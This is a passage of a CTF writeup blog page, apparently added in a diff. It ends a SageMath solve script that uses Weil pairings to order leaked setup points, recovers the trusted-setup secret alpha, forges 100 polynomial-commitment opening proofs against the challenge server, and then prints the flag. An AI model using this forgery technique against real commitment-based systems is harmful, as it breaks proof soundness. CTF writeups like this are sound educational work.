+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build full pairing matrix and global frequency table</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># M[i][j] = e(pub[i], psi(pub[j]))</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Equal values lie on anti-diagonals in the correct order.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span>pairvals <span style="color:#f92672">=</span> [[<span style="color:#66d9ef">None</span>] <span style="color:#f92672">*</span> n <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(n)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
+</span></span><span style="display:flex;"><span>    Pi <span style="color:#f92672">=</span> E2(pub_pts[i])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(n):
+</span></span><span style="display:flex;"><span>        pairvals[i][j] <span style="color:#f92672">=</span> Pi<span style="color:#f92672">.</span>weil_pairing(psi(pub_pts[j]), o)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>global_counts <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(n):
+</span></span><span style="display:flex;"><span>        v <span style="color:#f92672">=</span> pairvals[i][j]
+</span></span><span style="display:flex;"><span>        global_counts[v] <span style="color:#f92672">=</span> global_counts<span style="color:#f92672">.</span>get(v, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># In the row corresponding to true G1 = alpha^0 G1, the anti-diagonal sizes are:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1,2,3,...,40</span>
+</span></span><span style="display:flex;"><span>order_idx <span style="color:#f92672">=</span> sorted(range(n), key<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> j: global_counts[pairvals[g1_index][j]])
+</span></span><span style="display:flex;"><span>ordered_pts <span style="color:#f92672">=</span> [pub_pts[j] <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> order_idx]
+</span></span><span style="display:flex;"><span>ordered_coeffs <span style="color:#f92672">=</span> [pub_coeffs[j] <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> order_idx]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ordered_pts[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> true_G1_E:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Recovered order does not start with true G1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>row_sizes <span style="color:#f92672">=</span> [global_counts[pairvals[g1_index][j]] <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> order_idx]
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Recovered order row sizes = </span><span style="color:#e6db74">{</span>row_sizes<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Recover alpha from the setup polynomial</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sum c_i * alpha^i = 0 mod o</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span>R <span style="color:#f92672">=</span> PolynomialRing(GF(o), <span style="color:#e6db74">&#34;x&#34;</span>)
+</span></span><span style="display:flex;"><span>x <span style="color:#f92672">=</span> R<span style="color:#f92672">.</span>gen()
+</span></span><span style="display:flex;"><span>Ppol <span style="color:#f92672">=</span> sum(GF(o)(ordered_coeffs[i]) <span style="color:#f92672">*</span> x<span style="color:#f92672">**</span>i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>roots <span style="color:#f92672">=</span> [Integer(r) <span style="color:#66d9ef">for</span> (r, _) <span style="color:#f92672">in</span> Ppol<span style="color:#f92672">.</span>roots()]
+</span></span><span style="display:flex;"><span>alpha <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> roots:
+</span></span><span style="display:flex;"><span>    ok <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r <span style="color:#f92672">*</span> ordered_pts[i] <span style="color:#f92672">!=</span> ordered_pts[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]:
+</span></span><span style="display:flex;"><span>            ok <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ok:
+</span></span><span style="display:flex;"><span>        alpha <span style="color:#f92672">=</span> r
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> alpha <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Could not recover alpha&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Recovered alpha&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Commitment was C = G1, so c_scalar = 1</span>
+</span></span><span style="display:flex;"><span>c_scalar <span style="color:#f92672">=</span> Integer(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Answer 100 openings</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Choose degree-41 polynomial y = z^41 mod o.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Witness scalar:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   w = (c - y) / (alpha - z) mod o</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and pi = w * G1</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This satisfies:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   e(pi, G2alpha - z G2) = e(C - y G1, G2)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> rnd <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
+</span></span><span style="display:flex;"><span>    z_full <span style="color:#f92672">=</span> recv_next_z()
+</span></span><span style="display:flex;"><span>    z <span style="color:#f92672">=</span> z_full <span style="color:#f92672">%</span> o
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    y <span style="color:#f92672">=</span> power_mod(z, <span style="color:#ae81ff">41</span>, o)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Avoid edge cases where denominator or witness would be zero</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> z <span style="color:#f92672">==</span> alpha:
+</span></span><span style="display:flex;"><span>        y <span style="color:#f92672">=</span> (y <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> o
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    denom <span style="color:#f92672">=</span> (alpha <span style="color:#f92672">-</span> z) <span style="color:#f92672">%</span> o
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> denom <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Bad luck: z == alpha mod o&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    w_scalar <span style="color:#f92672">=</span> ((c_scalar <span style="color:#f92672">-</span> y) <span style="color:#f92672">*</span> inverse_mod(denom, o)) <span style="color:#f92672">%</span> o
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> w_scalar <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        y <span style="color:#f92672">=</span> (y <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> o
+</span></span><span style="display:flex;"><span>        w_scalar <span style="color:#f92672">=</span> ((c_scalar <span style="color:#f92672">-</span> y) <span style="color:#f92672">*</span> inverse_mod(denom, o)) <span style="color:#f92672">%</span> o
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> w_scalar <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Unexpected zero witness scalar twice&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Pi <span style="color:#f92672">=</span> w_scalar <span style="color:#f92672">*</span> true_G1_E
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> Pi <span style="color:#f92672">==</span> E(<span style="color:#ae81ff">0</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Witness point is infinity&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(Integer(y))<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Integer(Pi[<span style="color:#ae81ff">0</span>])<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>Integer(Pi[<span style="color:#ae81ff">1</span>])<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (rnd <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Answered </span><span style="color:#e6db74">{</span>rnd <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/100 openings&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/unr-2026/toxic.png#center"></p>
+<p><code>flag{Alph4_h4s_t0_b3_1nc1n3r4t3d_947a1a1e8895d3d483ab}</code></p>
+<hr>
+<p>The rest of the challenges were either solved by my teammate or completely by ChatGPT so that was it for this writeup. Thank you for reading until the end, and I&rsquo;m glad if this can be of any help to anyone.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/ctf/">Ctf</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
